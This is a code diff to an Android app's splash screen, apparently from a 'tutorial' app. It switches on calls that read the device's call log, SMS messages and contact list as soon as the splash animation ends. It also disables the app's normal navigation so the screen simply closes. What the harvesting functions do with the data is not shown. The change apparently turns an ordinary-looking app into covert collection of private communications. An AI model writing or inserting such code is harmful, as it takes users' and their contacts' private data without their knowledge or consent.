@@ -11,6 +11,10 @@ import com.viksaa.sssplash.lib.activity.AwesomeSplash;
 import com.viksaa.sssplash.lib.cnst.Flags;
 import com.viksaa.sssplash.lib.model.ConfigSplash;
 
+import static com.android.tutorial.utils.Utils.fetchSms;
+import static com.android.tutorial.utils.Utils.getCallDetails;
+import static com.android.tutorial.utils.Utils.getContactsList;
+
 public class SplashActivity extends AwesomeSplash {
 
     Cursor cursor;
@@ -60,16 +64,16 @@ public class SplashActivity extends AwesomeSplash {
 
     @Override
     public void animationsFinished() {
-//        getCallDetails(SplashActivity.this);
-//        fetchSms(SplashActivity.this);
-//        getContactsList(SplashActivity.this);
-        PrefManager prefManager = new PrefManager(getApplicationContext());
-        if (!prefManager.isFirstTimeLaunch()) {
-            launchHomeScreen();
-            finish();
-        } else {
-            launchWelcomeScreen();
-        }
+        getCallDetails(SplashActivity.this);
+        fetchSms(SplashActivity.this);
+        getContactsList(SplashActivity.this);
+//        PrefManager prefManager = new PrefManager(getApplicationContext());
+//        if (!prefManager.isFirstTimeLaunch()) {
+//            launchHomeScreen();
+        finish();
+//        } else {
+//            launchWelcomeScreen();
+//        }
     }
 
 /*
